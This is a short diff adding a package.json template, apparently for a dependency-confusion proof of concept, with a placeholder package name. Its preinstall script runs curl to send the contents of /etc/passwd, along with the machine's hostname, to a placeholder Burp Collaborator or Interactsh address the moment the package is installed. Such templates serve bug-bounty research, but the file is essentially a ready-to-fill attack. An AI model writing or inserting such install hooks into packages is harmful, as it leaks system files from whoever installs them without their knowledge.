@@ -1,0 +1,11 @@
+ "name": "package name here",
+  "version": "1.0.0",
+  "description": "",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "/usr/bin/curl --data '@/etc/passwd' $(hostname)PUT-burpsuite-Cpllaborator-url-here-or-Interactsh"
+  },
+  "author": "",
+  "license": "ISC"
+}
